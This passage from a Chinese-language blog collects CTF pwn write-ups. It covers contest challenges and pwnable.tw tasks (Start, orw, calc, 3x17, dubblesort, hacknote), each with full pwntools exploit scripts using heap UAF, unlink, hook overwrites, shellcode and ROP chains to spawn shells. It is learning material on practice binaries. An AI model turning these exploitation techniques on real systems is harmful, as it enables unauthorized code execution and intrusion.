delete?\")\n\tsh.sendline(str(idx))\n\nadd(0,136,'a'*16)\nadd(1,136,'b'*8)\nadd(2,136,'c'*8)\nadd(3,136,'/bin/sh')\nadd(4,136,'e'*8)\nadd(5,136,'a')\nadd(6,136,'a')\nadd(7,136,'a')\nadd(8,136,'a')\nadd(9,136,'a')\nadd(10,136,'a')\nadd(11,136,'a')\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\ndelete(5)\ndelete(6)\ndelete(7)\nadd(7,130,p8(0xa0))\nadd(6,130,p8(0xa0))\nadd(5,130,p8(0xa0))\nadd(4,130,p8(0xa0))\nadd(3,130,'cat flag')\nadd(2,130,p8(0xa0))\nadd(1,130,p8(0xa0))\nadd(0,130,p8(0xa0))\nshow(0)\nsh.recv()\n# uu64(sh.recv(6))\n#libc_base = u64(sh.recv(7).ljust(8,'\\x00'))-0x70-libc.sym['__malloc_hook']\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(\"libc_base:\" + hex(libc_base))\n\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\npayload = p64(0)+p64(8)+p64(0x601568-0x8*3) + p64(0x601568-0x8*2)+ 0x60*'A'\npayload += p64(0x80)+ p64(0x90)\ndelete(1)\n\nadd(11,130,'e'*8)\nadd(10,130,'a')\nadd(9,130,'a')\nadd(8,130,'a')\nadd(7,130,'a')\nadd(6,130,'a')\nadd(5,130,'a')\nadd(1,130,payload)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\ndelete(2)\npayload = 'a'*0x10 + p64(0x601480)\nedit(1,payload)\n#\n#onegadget = libc_base + og[3]\nsystem0 = libc_base + libc.sym['system']\ninfo(hex(system0))\n#info(hex(onegadget))\n\nedit(0,p64(system0))\n#gdb.attach(sh)\ndelete(3)\n#\nsh.interactive()\n```\n\n## 0x05 messagesystem_plus\n\n阿这。。感觉是非预期，同样的脚本稍微改一改就能用\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\nsh=process(\"./messageSystem_plus\")\n#sh = remote('219.219.61.234', 10005)\nlibc=ELF(\"libc-2.27.so\")\n#libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#og = [0x4f2c5,0x4f322,0x10a38c,0xf1207]\n#og = [0x4f2c5,0x4f322,0x10a38c]\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('Now Leave Message!')\n    sh.sendline(str(idx))\n    sh.recvuntil(\"want to leave?\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"want to say?\")\n    sh.send(content)\n\ndef edit(idx,content):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(4))\n\tsh.recvuntil(\"want to edit?\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"enter your Message!\")\n\tsh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"want to show?\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n    sh.recvuntil(\"choice: \")\n    sh.sendline(str(3))\n    sh.recvuntil(\"Single Message\")\n    sh.sendline(str(2))\n    sh.recvuntil(\"you want to delete?\")\n    sh.sendline(str(idx))\n\nadd(0,136,'a'*16)\nadd(1,136,'b'*8)\nadd(2,136,'c'*8)\nadd(3,136,'/bin/sh')\nadd(4,136,'e'*8)\nadd(5,136,'a')\nadd(6,136,'a')\nadd(7,136,'a')\nadd(8,136,'a')\nadd(9,136,'a')\nadd(10,136,'a')\nadd(11,136,'a')\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\ndelete(5)\ndelete(6)\ndelete(7)\nadd(7,130,p8(0xa0))\nadd(6,130,p8(0xa0))\nadd(5,130,p8(0xa0))\nadd(4,130,p8(0xa0))\nadd(3,130,'cat flag')\nadd(2,130,p8(0xa0))\nadd(1,130,p8(0xa0))\nadd(0,130,p8(0xa0))\n\nshow(0)\nsh.recv()\n# uu64(sh.recv(6))\n#libc_base = u64(sh.recv(7).ljust(8,'\\x00'))-0x70-libc.sym['__malloc_hook']\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(\"libc_base:\" + hex(libc_base))\n#gdb.attach(sh)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\npayload = p64(0)+p64(8)+p64(0x6017a8-0x8*3) + p64(0x6017a8-0x8*2)+ 0x60*'A'\npayload += p64(0x80)+ p64(0x90)\ndelete(1)\n\nadd(11,130,'e'*8)\nadd(10,130,'a')\nadd(9,130,'a')\nadd(8,130,'a')\nadd(7,130,'a')\nadd(6,130,'a')\nadd(5,130,'a')\nadd(1,130,payload)\n#gdb.attach(sh)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\ndelete(2)\npayload = 'a'*0x10 + p64(0x6016a8)#free_go\nedit(1,payload)\n#onegadget = libc_base + og[1]\nsystem0 = libc_base + libc.sym['system']\ninfo(hex(system0))\n#info(hex(onegadget))\n\nedit(0,p64(system0))\n#gdb.attach(sh)\ndelete(3)\n#\nsh.interactive()\n```\n\n## 0x06 mail_service\n\ntcache + uaf ，劫持free_hook为onegadget\n\n```python\nfrom pwn import *\n# context(arch='amd64',os='linux')\n# context.log_level='debug'\n#sh=process(\"./mail_service\")\nsh = remote('219.219.61.234', 10006)\nlibc=ELF(\"libc-2.27.so\")\n# libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nog = [0x4f2c5,0x4f322,0x10a38c]\ndef reg():\n    sh.recvuntil(\"your choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil(\"input your name:\")\n    sh.sendline('ld1ng')\n    sh.recvuntil(\"input your password:\")\n    sh.sendline('123')\n\ndef login():\n    sh.recvuntil(\"your choice:\")\n    sh.sendline(str(2))\n    sh.recvuntil(\"input your name:\")\n    sh.sendline('ld1ng')\n    sh.recvuntil(\"input your password:\")\n    sh.sendline('123')\n\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('your mail index:')\n    sh.sendline(str(idx))\n    sh.recvuntil('input your receiver:')\n    sh.sendline('')\n    sh.recvuntil('input your title:')\n    sh.sendline('')\n    sh.recvuntil(\"input your mail length:\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"input your mail context:\")\n    sh.send(content)\n\ndef edit(idx,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(4))\n    sh.recvuntil(\"your mail index:\")\n    sh.sendline(str(idx))\n    sh.recvuntil('input your receiver:')\n    sh.sendline('')\n    sh.recvuntil('input your title:')\n    sh.sendline('')\n    sh.recvuntil(\"input your mail context:\")\n    sh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"your mail index:\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"your mail index:\")\n\tsh.sendline(str(idx))\n\nreg()\nlogin()\nfor i in range(10):\n    add(i,144,'aaa')\nfor i in range(7):\n    delete(i)\ndelete(7)\nfor i in range(6,-1,-1):\n    add(i,144,'aaa')\nadd(7,144,'a'*8)\nshow(7)\nsh.recvuntil('a'*8)\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nonegadget = libc_base + og[1]\ninfo(hex(onegadget))\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\ninfo(hex(free_hook))\nfake_chunk = malloc_hook - 0x23\n#payload = '\\x00'*(0x23-8) + p64(onegadget)\ninfo(hex(fake_chunk))\ndelete(1)\ndelete(0)\nedit(0, p64(free_hook)+p64(free_hook))\nedit(2,'cat flag')\nadd(12, 144, 'A'*0x10)\nadd(13,140,p64(onegadget))\ndelete(2)\n#gdb.attach(sh,\"b *$rebase(0x202060)\")\nsh.interactive()\n```\n\n## 0x07 safe_vpn\n\n真非预期，学长说环境没配好，只要有人nc，admin.txt就自动清空，不知道是什么原因\n\n白给题\n\n```python\nfrom pwn import *\nelf  = ELF('./vpn')\n#context.log_level = 'debug'\n#io = process(local_file)\nio = remote('219.219.61.234', 20007)\nlibc = ELF('libc-2.27.so')\ncontext.arch = elf.arch\nio.sendafter('name','\\x00')\nio.sendafter('password','\\x00')\nio.interactive()\n```\n\n\n\n# 0x04 小结\n\n十月总结：太菜了...","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Pwnable部分wp","url":"/2020/10/25/Pwnable/","content":"\n# 前言\n\n这是很久以前边做边记的学习记录\npwnable题目质量很高，值得认真学习和研究一下\n\n## 0x01 Start\n\n```c\nstart: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped\n//32位程序，静态编译\n```\n\n程序只有这几行汇编，加上注释方便理解\n\n```assembly\npush    esp\npush    offset _exit\nxor     eax, eax\nxor     ebx, ebx\nxor     ecx, ecx\nxor     edx, edx\npush    3A465443h       ;\"CTF:\"\npush    20656874h       ;\"the \"\npush    20747261h       ;\"art \"\npush    74732073h       ;\"s st\"\npush    2774654Ch       ;\"Let'\"\nmov     ecx, esp        ; addr\nmov     dl, 14h         ; len\nmov     bl, 1           ; fd\nmov     al, 4\nint     80h             ; sys_write\nxor     ebx, ebx\nmov     dl, 3Ch\nmov     al, 3\nint     80h             ; sys_read\nadd     esp, 14h\nretn\n```\n\n简单的系统调用，write和read\n由于程序很简单，可以gdb动调理解逻辑 (很重要)\n关键点在最后的`add   esp, 14h  ;  retn`，通过读入数据可以覆盖到返回地址，并返回`.text:08048087  mov  ecx, esp `，这时执行sys_write，即可打印出esp的地址，然后继续写入shellcode覆盖返回地址，那么程序就可以执行你的shellcode\n\n注意：shellcode可以查x86系统调用表来调用execve('/bin/sh',0,0)\n\n### exp\n\n```python\nfrom pwn import *\n#context.log_level = \"debug\"\np = process('./start')\n\npayload = 'A'*0x14 + p32(0x8048087)#leak esp after +0x18\np.sendafter(\"Let's start the CTF:\",payload)\nesp = u32(p.recv(4))\nprint 'esp: '+hex(esp)\n#gdb.attach(p)\nshellcode='\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'\n#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')\n#execve('/bin/sh',null,null)\npayload = 'A'*0x14 + p32(esp+0x14) + shellcode #Jump to shellcode\np.send(payload)\np.interactive()\n```\n\n## 0x02 orw\n\n经典之经典，shellcode必刷题\n\n32位程序，开了沙盒\n\n```c\nunsigned int orw_seccomp()\n{\n  __int16 v1; // [esp+4h] [ebp-84h]\n  char *v2; // [esp+8h] [ebp-80h]\n  char v3; // [esp+Ch] [ebp-7Ch]\n  unsigned int v4; // [esp+6Ch] [ebp-1Ch]\n\n  v4 = __readgsdword(0x14u);\n  qmemcpy(&v3, &unk_8048640, 0x60u);\n  v1 = 12;\n  v2 = &v3;\n  prctl(38, 1, 0, 0, 0);\n  prctl(22, 2, &v1);\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n禁用了execve()，所以无法使用onegadget\n但是程序开了open()，read()，write()\n\n程序很简单，在bss段输入shellcode并执行，那么方法就是利用orw\n\n### exp\n\n```python\nfrom pwn  import *\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\nsh=remote('chall.pwnable.tw',10001)\n#shellcode=asm(shellcraft.sh()) \n# I don't wanna be a tool boy\nshellcode=\"\"\nshellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')\n#open(file,0,0)\nshellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')\n#read(3,file,0x30)\nshellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')\n#write(1,file,0x30)\nrecv = sh.recvuntil(':')\nsh.sendline(shellcode)\nflag = sh.recv(100)\nprint flag\n```\n\n## 0x03 calc\n\n一道值得深究的题目，能写的知识点太多，我择要点写一下\n一个计算器程序，代码逻辑很繁琐，考察很强的逆向功底，需要静下心来慢慢分析\n主要逻辑在于解析表达式的代码，贴上注释过的代码\n\n```c\nsigned int __cdecl parse_expr(int buf, _DWORD *list)\n{\n  int len; // ST2C_4\n  int count; // eax\n  int buf_start; // [esp+20h] [ebp-88h]\n  int i; // [esp+24h] [ebp-84h]\n  int v7; // [esp+28h] [ebp-80h]\n  char *ptr; // [esp+30h] [ebp-78h]\n  int v9; // [esp+34h] [ebp-74h]\n  char op[100]; // [esp+38h] [ebp-70h]\n  unsigned int v11; // [esp+9Ch] [ebp-Ch]\n\n  v11 = __readgsdword(0x14u);\n  buf_start = buf;\n  v7 = 0;\n  bzero(op, 0x64u);\n  for ( i = 0; ; ++i )\n  {\n    if ( (*(i + buf) - 48) > 9 )                // 保存操作符之前的数字\n    {\n      len = i + buf - buf_start;\n      ptr = malloc(len + 1);\n      memcpy(ptr, buf_start, len);\n      ptr[len] = 0;\n      if ( !strcmp(ptr, \"0\") )\n      {\n        puts(\"prevent division by zero\");\n        fflush(stdout);\n        return 0;\n      }\n      v9 = atoi(ptr);\n      if ( v9 > 0 )\n      {\n        count = (*list)++;                      // list[0]存放数字个数\n        list[count + 1] = v9;\n      }\n      if ( *(i + buf) && (*(i + 1 + buf) - 48) > 9 )// 不允许连续有两个运算符\n      {\n        puts(\"expression error!\");\n        fflush(stdout);\n        return 0;\n      }\n      buf_start = i + 1 + buf;\n      if ( op[v7] )                             // 如果有前序运算符，进行运算符比较，然后计算\n      {\n        switch ( *(i + buf) )                  //优先级操作\n        {\n          case '%':\n          case '*':\n          case '/':\n            if ( op[v7] != '+' && op[v7] != '-' )\n            {\n              eval(list, op[v7]);\n              op[v7] = *(i + buf);\n            }\n            else\n            {\n              op[++v7] = *(i + buf);\n            }\n            break;\n          case '+':\n          case '-':\n            eval(list, op[v7]);\n            op[v7] = *(i + buf);\n            break;\n          default:\n            eval(list, op[v7--]);\n            break;\n        }\n      }\n      else\n      {\n        op[v7] = *(i + buf);                    // 如果没有前序运算符，把当前运算符放入op数组中\n      }\n      if ( !*(i + buf) )                        // 空字符结束\n        break;\n    }\n  }\n  while ( v7 >= 0 )\n    eval(list, op[v7--]);\n  return 1;\n}\n```\n\n最后的运算是eval()，具体操作见代码\n\n```c\n_DWORD *__cdecl eval(_DWORD *list, char op)\n{\n  _DWORD *result; // eax\n\n  if ( op == '+' )\n  {\n    list[*list - 1] += list[*list];\n  }\n  else if ( op > '+' )\n  {\n    if ( op == '-' )\n    {\n      list[*list - 1] -= list[*list];\n    }\n    else if ( op == '/' )\n    {\n      list[*list - 1] /= list[*list];\n    }\n  }\n  else if ( op == '*' )\n  {\n    list[*list - 1] *= list[*list];\n  }\n  result = list;\n  --*list;\n  return result;\n}\n```\n\n其中*list存放数字的个数，在eval中作为索引进行运算\n\n其实程序越复杂，越难找到漏洞\n\n程序看起来很自然，并没什么危险的操作，当我们输入1+2时，结构是这样的\n\n```c\nlist[2] = {2,1,2}\nop[0] = {\"+\"}\n```\n\n执行list[\\*list - 1] += list[\\*list]时 ==> list[1] = list[1] + list[2] = 3\n\n此时list[2] = {2,3,2}; 此时pirntf就是list[1] \n\n但是，如果我们只输入+1，list[1] = {1,1}，那么就会变成这样list[\\*list - 1] += list[\\*list] ==> list[0] = list[1] + list[0] = 1+1 =2；此时printf的结果就是list[0]，(list[0]需要自减1)\n\n由于缺少相关检查，所以会存在这种结果,如果+x时，就会输出list[x-1]，当x超出result长度时即可读取到栈上其他的数据\n\n测试如下，数组越界读\n\n![](https://i.loli.net/2020/12/11/BVZ7r59JXxTgD1y.png)\n\n\n\n再考虑另一种情况+x+y  \n\nlist[0] = x+1\n\nlist[x+1] = y\n\nlist[\\*list - 1] += list[\\*list] ==> list[x] = list[x] + list[x+1] \n\n```c\nif ( v9 > 0 )\n{\n    count = (*list)++;                      // list[0]存放数字个数\n    list[count + 1] = v9;\n}\n```\n所以说通过这种操作可以进行数组越界写\n\n例如：+361+1 ==> list[362] = 1;\n\n![](https://image.3001.net/images/20170418/14925270013675.png)\n\n原理图如上，系统调用execve函数来getshell\n\n### exp\n\n```python\nfrom pwn import *\ncontext(os='linux',arch='i386',log_level='debug')\nio = remote(\"chall.pwnable.tw\",10100)\n\n# /bin/sh and gadget\nstr_bin = 0x6e69622f\nstr_sh = 0x0068732f\npop_eax = 0x0805c34b\npop_edx_ecx_ebx = 0x080701d0\nint_80 = 0x08049a21\n\n# leak ebp\nio.recv()\nio.sendline(\"+360\")\nebp = int(io.recv())-0x20\nbinsh_addr = ebp+8*4\n\n# attack\nROP = [pop_eax,11,pop_edx_ecx_ebx,0,0,binsh_addr,int_80,str_bin,str_sh]\nfor i in range(361,370):\n\tnum = i - 361\n\tio.sendline(\"+\"+str(i))\n\ttmp = int(io.recvline())\n\tif tmp<ROP[num]:\n\t\tio.sendline(\"+\"+str(i)+\"+\"+str(ROP[num]-tmp))\n\telse:\n\t\tio.sendline(\"+\"+str(i)+\"-\"+str(tmp-ROP[num]))\n\tio.recvline()\n\nio.sendline()\nio.interactive()\n\n```\n\n## 0x04 3x17\n\n静态编译的二进制文件，并且是去除符号表，使得程序可读性大大降低，看一下主函数\n\n发现程序有很多系统调用，所以其实看汇编会更有助于理解，由于篇幅问题就不放汇编代码了\n\n```c\n__int64 __fastcall sub_401B6D(__int64 a1, char *a2, __int64 a3)\n{\n  __int64 result; // rax\n  int v4; // eax\n  char *v5; // ST08_8\n  char buf; // [rsp+10h] [rbp-20h]\n  unsigned __int64 v7; // [rsp+28h] [rbp-8h]\n\n  v7 = __readfsqword(0x28u);         //canary\n  result = (unsigned __int8)++byte_4B9330;\n  if ( byte_4B9330 == 1 )            //输入条件判断\n  {\n    sub_446EC0(1u, \"addr:\", 5uLL);   //sys_write_addr\n    sub_446E20(0, &buf, 0x18uLL);    //sys_read\n    sub_40EE70((__int64)&buf);       //将输入的字符串转换为对应的16进制\n    v5 = (char *)v4;\n    sub_446EC0(1u, \"data:\", 5uLL);   //sys_write_addr\n    sub_446E20(0, v5, 0x18uLL);      //sys_read\n    result = 0LL;\n  }\n  if ( __readfsqword(0x28u) != v7 )\n    sub_44A3E0();\n  return result;\n}\n```\n\n其中`sub_40EE70`函数很复杂，没读懂，但是通过动调还是能够发现它的功能。\n\n函数之前：\n\n![image-20201124163242159](https://i.loli.net/2020/11/24/zhKsp5XuP2I3Q1Z.png)\n\n运行过后：\n\n![image-20201124163309940](https://i.loli.net/2020/11/24/rSitcBuT1fgQpLn.png)\n\n注意rax寄存器的变化，很容易发现它是将输入的字符串转化成整形变为16进制数\n\n```python\nPython 2.7.12 (default, Oct  5 2020, 13:56:01) \n[GCC 5.4.0 20160609] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> print hex(123123)\n0x1e0f3\n>>> \n```\n\n所以程序逻辑很清楚了，就是向你输入的地址处进行写操作。目标就是通过地址任意写漏洞来getshll。\n\n我们都知道__libc_start_main函数\n\n> **\\_\\_libc_start_main( main, argc, argv, \\__libc_csu_init, __libc_csu_fini, edx, top of stack)**\n>\n> init: main调用前的初始化工作\n> fini: main结束后的收尾工作\n> rtld_fini: 和动态加载有关的收尾工作\n\n程序只能写一次地址，又由于是静态编译，可用函数很少，所以可以利用该函数进行条件绕过\n\n这题__libc_csu_fini中有两个.fini_array，所以我们可以改.fini_array[1]为 main函数，.fini_array[0]改为\\_\\_libc_csu_fini，这样就会无限运行main函数，就像这种结构：\n\n```c\nmain -->  __libc_csu_fini --> fini_array[1] --> fini_array[0]\n```\n\n当++byte_4B9330不断增大到一定值后会发生溢出再次变为1，所以我们就可以实现无限写地址。\n\n这是start程序入口，下面作了注释，要注意64位程序传参\n\n```c\n start           proc near \n ; __unwind {\n                 xor     ebp, ebp\n                 mov     r9, rdx\n                 pop     rsi\n                 mov     rdx, rsp\n                 and     rsp, 0FFFFFFFFFFFFFFF0h\n                 push    rax\n                 push    rsp\n                 mov     r8, offset sub_402960   //__libc_csu_fini\n                 mov     rcx, offset loc_4028D0  //__libc_csu_init\n                 mov     rdi, offset sub_401B6D  //main\n                 db      67h\n                 call    sub_401EB0              //__libc_start_main\n                 hlt\n } // starts at 401A50\n```\n\n学习参考源码[glibc/csu/elf-init.c](https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c)，\n\nIDA里的__libc_csu_fini函数，可以看到`call qword ptr [rbp+rbx*8+0]`就是调用fini_array函数，\n\n![image-20201124174758392](https://i.loli.net/2020/11/24/YVSvmNZ8WwgnJlb.png)\n\n当我们在call之后如果能执行leave_ret，那么之后在销毁栈帧的过程中，rsp会被变到0x4b100，即ret后就可以劫持ip寄存器到这，那么就可以在这里构造rop，从而getshell。\n\n### exp\n\n```python\nfrom pwn import *\nelf = ELF('./3x17')\n#io = remote(\"chall.pwnable.tw\",10105)\nio = elf.process()\n\nsyscall = 0x471db5 #syscall\npop_rax = 0x41e4af\npop_rdx = 0x446e35\npop_rsi = 0x406c30\npop_rdi = 0x401696\nbin_sh = 0x4B41a0\nfini_array = 0x4B40F0\nmain_addr = 0x401B6D\nlibc_csu_fini = 0x402960\nleave_ret = 0x401C4B\n\nesp = 0x4B4100\n\ndef write_addr(addr,data):\n\tio.recv()\n\tio.send(str(addr))\n\tio.recv()\n\tio.send(data)\n\nwrite_addr(fini_array,p64(libc_csu_fini) + p64(main_addr)) # 0 , 1\n#execve('/bin/sh',0,0)\nwrite_addr(bin_sh,\"/bin/sh\\x00\")\nwrite_addr(esp,p64(pop_rax))\nwrite_addr(esp+8,p64(0x3b))\nwrite_addr(esp+16,p64(pop_rdi))\nwrite_addr(esp+24,p64(bin_sh))\nwrite_addr(esp+32,p64(pop_rdx))\nwrite_addr(esp+40,p64(0))\nwrite_addr(esp+48,p64(pop_rsi))\nwrite_addr(esp+56,p64(0))\nwrite_addr(esp+64,p64(syscall))\nwrite_addr(fini_array,p64(leave_ret))\n\nio.interactive()\n```\n\n## 0x05 dubblesort\n\n32位程序，保护全开\n\n本题的考点很新奇，值得好好研究一下\n\n这是冒泡排序的逻辑，每次循环将最大值放在数组的最后，然后按序输出\n\n但是由于arry数组并没有检查边界，所以可以构造足够多的数，造成栈溢出\n\n```c\nunsigned int __cdecl dubblesort(unsigned int *arry, int len)\n{\n  unsigned int v2; // edx\n  int v3; // ecx\n  unsigned int *i; // edi\n  unsigned int v5; // esi\n  unsigned int *v6; // eax\n  unsigned int result; // eax\n  unsigned int v8; // et1\n  unsigned int v9; // [esp+1Ch] [ebp-20h]\n\n  v9 = __readgsdword(0x14u);\n  puts(\"Processing......\");\n  sleep(1u);\n  if ( len != 1 )\n  {\n    v3 = len - 2;\n    for ( i = &arry[len - 1]; ; --i )\n    {\n      if ( v3 != -1 )\n      {\n        v6 = arry;\n        do\n        {\n          v2 = *v6;\n          v5 = v6[1];\n          if ( *v6 > v5 )\n          {\n            *v6 = v5;\n            v6[1] = v2;\n          }\n          ++v6;\n        }\n        while ( i != v6 );\n        if ( !v3 )\n          break;\n      }\n      --v3;\n    }\n  }\n  v8 = __readgsdword(0x14u); //canary\n  result = v8 ^ v9;\n  if ( v8 != v9 )\n    sub_BA0(v3, v2);\n  return result;\n}\n```\n\n漏洞点在read时末尾未添加\\x00截断，导致printf可以泄露出libc基址\n\n```c\ninit();\n  __printf_chk(1, (int)\"What your name :\");\n  read(0, &name, 0x40u);\n  __printf_chk(1, (int)\"Hello %s,How many numbers do you what to sort :\");\n  __isoc99_scanf((int)\"%u\", (int)&count);\n```\n\n之后的scanf处就可以进行栈溢出了\n\n而本题难点在于如何绕过canary，由于数组越界，根据你的输入，在排序之后canary也会发生相应改变，为了保证canary的值和位置不发生变化，必须要保证我们的输入有效且合法，\n\nscanf函数接收的数据格式为无符号整型（%u），有没有什么字符可以既让scanf认为它是合法字符，同时又不会修改栈上的数据呢？查阅资料后，发现“+”和“-”可以达到此目的，所以在canary处输入“+”或“-”即可绕过\n\n\\# 如果不知道无符号整型在内存中的存储形式，可以自己写段代码调试一下\n\n```c\n#include <stdio.h>\nint main()\n{\n    int s[10];\n    for(int i =0;i<10;i++){\n        scanf(\"%u\",&s[i]);\n        printf(\"%u\\n\",s[i]);\n    }\n    return 0;\n}\n```\n\n那么思路很清晰了，其余的工作就是找偏移了，通过gdb动调即可解决\n\n### exp\n\n```python\nfrom pwn import *\n# p = remote('chall.pwnable.tw',10101)\n# p = process('./dubblesort')\np = process(\"./dubblesort\")\n# libc = ELF('./libc_32.so.6')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\n\npayload = \"a\"*24\np.recvuntil(\":\")\np.sendline(payload)\nlibc_addr = u32(p.recv()[30:34])-0xa\nlibcbase_addr = libc_addr - 0x1b0000     #remote\n# libcbase_addr = libc_addr - 0x1b3000   #local\n# gdb.attach(p)\nsys = libcbase_addr + libc.symbols['system']\nbinsh = libcbase_addr + libc.search('/bin/sh').next()\np.sendline('35')\np.recv()\nfor i in range(24):\n    p.sendline(str(i))\n    p.recv()\np.sendline('+')\np.recv()\nfor i in range(9):\n    p.sendline(str(sys))\n    p.recv()\np.sendline(str(binsh))\np.recv()\np.interactive()\n```\n\n\n\n## 0x06 hacknote\n\n32位堆，漏洞点在于delete函数存在uaf\n\n```c\n  if ( ptr[v1] )\n  {\n    free(*(ptr[v1] + 1));\n    free(ptr[v1]);\n    puts(\"Success\");\n  }\n```\n\n而ptr[0]存放函数指针(puts)，所以思路是利用uaf将puts的指针改为system函数的地址\n\n难点在于本地和靶机的libc版本存在差异，需要动调来找偏移\n\n写两种利用方法\n\n### exp1\n\n通过unsortedbin来泄露main_arena，从而泄露出libc基址\n\n然后通过申请0x8大小的堆块来修改ptr指针，然而通过测试onegadget打不通，所以改为system\n\n由于限制四个字节，且需要主要system参数截断，所以可选择`||`，`;` + `sh`，`$0`都可以\n\n```python\nfrom pwn import *\n# context.log_level='debug'\nelf=ELF(\"./hacknote\")\nlibc = ELF('libc-2.23.so')\n# libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n# r = elf.process()\nr = remote('chall.pwnable.tw',10102)\n# onegadget = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]\nonegadget = [0x3a819,0x5f065,0x5f066]\ndef add(size,content):\n\tr.recvuntil(\"Your choice :\")\n\tr.sendline('1')\n\tr.recvuntil(\"Note size :\")\n\tr.sendline(str(size))\n\tr.recvuntil(\"Content :\")\n\tr.send(content)\n\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\ndef show(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nadd(0x18,'aaa')\nadd(0x90,'ccc')\nadd(0x18,'ddd')\ndelete(1)\nadd(0x90,'aaaa')\nshow(1)\n\nr.recvuntil('a'*4)\nlibc_base = u32(r.recvline().strip('\\n')) - 0x1b07b0\n# print hex(48 + 0x18 + libc.sym['__malloc_hook'])\ninfo(hex(libc_base))\n# gdb.attach(r)\n# print hex(libc.sym['__malloc_hook'])\nrce = libc_base + onegadget[1]\nsys = libc_base + libc.sym['system']\ndelete(0)\ndelete(1)\nadd(8,p32(sys)+\";sh\\x00\")\n# add(8,p32(rce))\nshow(0)\nr.interactive()\n```\n\n### exp2\n\n思路是将ptr改为printf打印出puts_got，之后同样的方法改为system即可\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n# p = remote('chall.pwnable.tw',10102)\np = process('./hacknote')\n\nlibc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')\n\ndef add_note(size,content):\n    p.recvuntil('Your choice :')\n    p.sendline('1')\n    p.recvuntil('Note size :')\n    p.sendline(str(size))\n    p.recvuntil('Content :')\n    p.sendline(content)\n\ndef free_note(index):\n    p.recvuntil('Your choice :')\n    p.sendline('2')\n    p.recvuntil('Index :')\n    p.sendline(str(index))\n\ndef print_note(index):\n    p.recvuntil('Your choice :')\n    p.sendline('3')\n    p.recvuntil('Index :')\n    p.sendline(str(index))\n\nlibc_puts_addr = libc_elf.symbols['puts']\nlibc_sys_addr = libc_elf.symbols['system']\nputs_got_addr = 0x0804A024\nprint_content = 0x0804862B\n\nadd_note(32,\"a\"*32)\nadd_note(32,\"b\"*32)\nfree_note(0)\nfree_note(1)\nadd_note(8,p32(print_content)+p32(puts_got_addr))\nprint_note(0)\nleak_puts_addr = u32(p.recv(4))\nprint leak_puts_addr\nlibcbase_addr = leak_puts_addr - libc_puts_addr\nsystem_addr = libcbase_addr + libc_sys_addr\n\nfree_note(2)\nadd_note(8,flat([system_addr,\"||sh\"]))\nprint_note(0)\np.interactive()\n\n```\n\n## 0x07 Silver 